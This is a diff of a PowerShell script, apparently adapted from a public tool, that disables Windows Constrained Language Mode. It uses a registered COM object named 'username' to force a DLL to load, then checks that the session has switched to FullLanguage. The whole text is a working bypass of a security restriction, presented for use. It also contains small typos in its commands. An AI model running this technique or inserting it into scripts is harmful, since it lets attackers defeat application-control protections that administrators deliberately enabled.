@@ -29,12 +29,19 @@ New-ItemProperty -Path $key -Name "(Default)" -Value $uuid -ProperType String -F
 Write-Host "@_xpn_ Constrained Language Mode disabler"
 Write-Host "[*] Starting..."
 
+Write-Host "[*] Executing bypass trigger..."
 try {
-new-object -ComObject xpn -erroraction 'silentlycontinue' | Out-Null
-} catch {
-}
+    # 1. Force Windows to load our DLL via the registered 'username' COM key
+    New-Object -ComObject username -ErrorAction 'SilentlyContinue' | Out-Null
+} catch {}
+
+Write-Host "[*] Verifying current language state..."
+# 2. Check the environment state. It should now output 'FullLanguage' instead of 'ConstrainedLanguage'
+$ExecutionContext.SessionState.LanguageMode
+
+
 Write-Host "[*] Done, Constrained Language Mode should now be disabled" 
 
 
-### execute the above with `#ExecutionContext.SessionState.LanguageMode` and `New-Object -ComObject username -ErrorAction 'SilentlyContine' | Out-Null`
+### execute the above with `New-Object -ComObject username -ErrorAction 'SilentlyContine' | Out-Null`
 
